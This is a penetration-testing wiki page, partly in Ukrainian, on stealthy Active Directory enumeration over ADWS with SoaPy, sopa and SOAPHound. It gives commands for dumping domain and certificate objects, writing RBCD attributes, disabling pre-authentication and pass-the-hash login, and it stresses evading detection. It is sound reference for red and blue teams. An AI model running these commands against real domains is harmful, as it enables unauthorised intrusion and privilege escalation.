# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## What is ADWS?

Active Directory Web Services (ADWS) is **enabled by default on every Domain Controller since Windows Server 2008 R2** and listens on TCP **9389**.  Despite the name, **no HTTP is involved**.  Instead, the service exposes LDAP-style data through a stack of proprietary .NET framing protocols:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Оскільки трафік інкапсульований у цих бінарних SOAP-фреймах і передається по незвичному порту, **перерахунок через ADWS значно менш ймовірно буде інспектований, відфільтрований або розпізнаний за сигнатурами, ніж класичний LDAP/389 & 636 трафік**. Для операторів це означає:

* Stealthier recon – Blue teams often concentrate on LDAP queries.
* Можливість збирати дані з **non-Windows hosts (Linux, macOS)** шляхом тунелювання 9389/TCP через SOCKS-проксі.
* Ті самі дані, які ви б отримали через LDAP (users, groups, ACLs, schema тощо) і можливість виконувати **writes** (наприклад `msDs-AllowedToActOnBehalfOfOtherIdentity` для **RBCD**).

Взаємодії ADWS реалізовані через WS-Enumeration: кожен запит починається з повідомлення `Enumerate`, яке визначає LDAP-фільтр/атрибути і повертає `EnumerationContext` GUID, після чого йдуть одне або кілька повідомлень `Pull`, що стрімлять результати до розміру вікна, визначеного сервером. Контексти вичерпуються приблизно через ~30 minutes, тому інструменти або повинні робити пагінацію результатів, або розбивати фільтри (префіксні запити по CN), щоб уникнути втрати стану. Коли запитуєте security descriptors, вкажіть контроль `LDAP_SERVER_SD_FLAGS_OID`, щоб опустити SACLs, інакше ADWS просто видаляє атрибут `nTSecurityDescriptor` зі свого SOAP-відповіді.

> NOTE: ADWS is also used by many RSAT GUI/PowerShell tools, so traffic may blend with legitimate admin activity.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) is a **full re-implementation of the ADWS protocol stack in pure Python**.  It crafts the NBFX/NBFSE/NNS/NMF frames byte-for-byte, allowing collection from Unix-like systems without touching the .NET runtime.

### Key Features

* Supports **proxying through SOCKS** (useful from C2 implants).
* Fine-grained search filters identical to LDAP `-q '(objectClass=user)'`.
* Optional **write** operations ( `--set` / `--delete` ).
* **BOFHound output mode** for direct ingestion into BloodHound.
* `--parse` flag to prettify timestamps / `userAccountControl` when human readability is required.

### Targeted collection flags & write operations

SoaPy ships with curated switches that replicate the most common LDAP hunting tasks over ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, plus raw `--query` / `--filter` knobs for custom pulls. Pair those with write primitives such as `--rbcd <source>` (sets `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging for targeted Kerberoasting) and `--asrep` (flip `DONT_REQ_PREAUTH` in `userAccountControl`).

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Використовуйте ті самі host/credentials, щоб негайно weaponise findings: dump RBCD-capable objects за допомогою `--rbcds`, потім застосуйте `--rbcd 'WEBSRV01$' --account 'FILE01$'` щоб stage Resource-Based Constrained Delegation chain (see [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) for the full abuse path).

### Встановлення (хост оператора)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump через ADWS (Linux/Windows)

* Форк `ldapdomaindump`, який замінює LDAP-запити на виклики ADWS по TCP/9389, щоб зменшити спрацьовування сигнатур LDAP.
* Виконує початкову перевірку доступності порту 9389, якщо не передано `--force` (пропускає перевірку, якщо порт-скани створюють шум або фільтруються).
* Протестовано проти Microsoft Defender for Endpoint та CrowdStrike Falcon — успішний обхід описано в README.

### Встановлення
```bash
pipx install .
```
### Використання
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Типовий вивід логів записує 9389 reachability check, ADWS bind і dump start/finish:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Практичний клієнт для ADWS у Golang

Подібно до soapy, [sopa](https://github.com/Macmod/sopa) реалізує стек протоколів ADWS (MS-NNS + MC-NMF + SOAP) у Golang, надаючи параметри командного рядка для виконання викликів ADWS, таких як:

* **Пошук та отримання об'єктів** - `query` / `get`
* **Життєвий цикл об'єкта** - `create [user|computer|group|ou|container|custom]` and `delete`
* **Редагування атрибутів** - `attr [add|replace|delete]`
* **Керування обліковими записами** - `set-password` / `change-password`
* та інші такі як `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

### Основні моменти відображення протоколів

* LDAP-пошуки здійснюються через **WS-Enumeration** (`Enumerate` + `Pull`) з проекцією атрибутів, контролем області (Base/OneLevel/Subtree) та пагінацією.
* Отримання одного об'єкта використовує **WS-Transfer** `Get`; зміни атрибутів — `Put`; видалення — `Delete`.
* Вбудоване створення об'єктів використовує **WS-Transfer ResourceFactory**; кастомні об'єкти використовують **IMDA AddRequest**, керований шаблонами YAML.
* Операції з паролями — це дії **MS-ADCAP** (`SetPassword`, `ChangePassword`).

### Неавторизоване виявлення метаданих (mex)

ADWS надає WS-MetadataExchange без облікових даних, що є швидким способом перевірити доступність перед автентифікацією:
```bash
sopa mex --dc <DC>
```
### DNS/DC discovery & Kerberos targeting notes

Sopa може розв'язувати DCs через SRV, якщо `--dc` опущено і вказано `--domain`. Він виконує запити в такому порядку і використовує ціль з найвищим пріоритетом:
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
З операційної точки зору, надавайте перевагу резолверу, керованому DC, щоб уникнути збоїв у сегментованих середовищах:

* Використовуйте `--dns <DC-IP>`, щоб **всі** SRV/PTR/forward-запити проходили через DNS, керований DC.
* Використовуйте `--dns-tcp`, коли UDP заблоковано або відповіді SRV великі.
* Якщо Kerberos увімкнено і `--dc` — це IP, sopa виконує **reverse PTR**, щоб отримати FQDN для коректного націлювання SPN/KDC. Якщо Kerberos не використовується, PTR-запит не виконується.

Приклад (IP + Kerberos, примусове використання DNS через DC):
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### Опції матеріалів для аутентифікації

Окрім plaintext passwords, sopa підтримує **NT hashes**, **Kerberos AES keys**, **ccache** та **PKINIT certificates** (PFX або PEM) для ADWS auth. Kerberos застосовується при використанні `--aes-key`, `-c` (ccache) або опцій, що базуються на сертифікатах.
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### Створення власних об'єктів за допомогою шаблонів

Для довільних класів об'єктів команда `create custom` приймає YAML-шаблон, який відображається на IMDA `AddRequest`:

* `parentDN` і `rdn` визначають контейнер і відносний DN.
* `attributes[].name` підтримує `cn` або іменований простір `addata:cn`.
* `attributes[].type` приймає `string|int|bool|base64|hex` або явні `xsd:*`.
* Не включайте `ad:relativeDistinguishedName` або `ad:container-hierarchy-parent`; sopa вставляє їх.
* Значення `hex` конвертуються в `xsd:base64Binary`; використовуйте `value: ""` щоб задати порожні рядки.

## SOAPHound – High-Volume ADWS Collection (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) — це .NET collector, який тримає всі LDAP-взаємодії всередині ADWS і видає JSON, сумісний з BloodHound v4. Він один раз будує повний кеш `objectSid`, `objectGUID`, `distinguishedName` та `objectClass` (`--buildcache`), а потім повторно використовує його для високопродуктивних проходів `--bhdump`, `--certdump` (ADCS) або `--dnsdump` (AD-integrated DNS), тож лише ~35 критичних атрибутів покидають DC. AutoSplit (`--autosplit --threshold <N>`) автоматично шардує запити за префіксом CN, щоб витримати 30-хвилинний таймаут EnumerationContext у великих лісах.

Типовий робочий процес на VM оператора, підключеному до домену:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Експортовані JSON-слоти безпосередньо у робочі процеси SharpHound/BloodHound — див. [BloodHound methodology](bloodhound.md) для ідей щодо подальшого графування. AutoSplit робить SOAPHound стійкішим у лісах з мільйонами об'єктів, при цьому кількість запитів менша, ніж у ADExplorer-style snapshots.

## Робочий процес прихованого збирання AD

Наведений нижче робочий процес показує, як перерахувати **domain & ADCS objects** через ADWS, конвертувати їх у BloodHound JSON і шукати шляхи атак, що базуються на сертифікатах — все з Linux:

1. **Tunnel 9389/TCP** з цільової мережі на вашу машину (наприклад через Chisel, Meterpreter, SSH dynamic port-forward тощо). Експортуйте `export HTTPS_PROXY=socks5://127.0.0.1:1080` або використайте параметри SoaPy `--proxyHost/--proxyPort`.

2. **Зібрати об'єкт кореневого домену:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Зібрати об'єкти, пов'язані з ADCS, з Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Конвертувати у BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Завантажте ZIP** у BloodHound GUI та виконайте cypher queries, такі як `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`, щоб виявити шляхи ескалації сертифікатів (ESC1, ESC8 тощо).

### Запис `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Поєднайте це з `s4u2proxy`/`Rubeus /getticket` для повного ланцюга **Resource-Based Constrained Delegation** (див. [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Підсумок інструментів

| Мета | Інструмент | Примітки |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Converts SoaPy/ldapsearch logs |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Can be proxied through same SOCKS |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | Generic client to interface with known ADWS endpoints - allows for enumeration, object creation, attribute modifications, and password changes |

## Посилання

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Sopa GitHub](https://github.com/Macmod/sopa)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
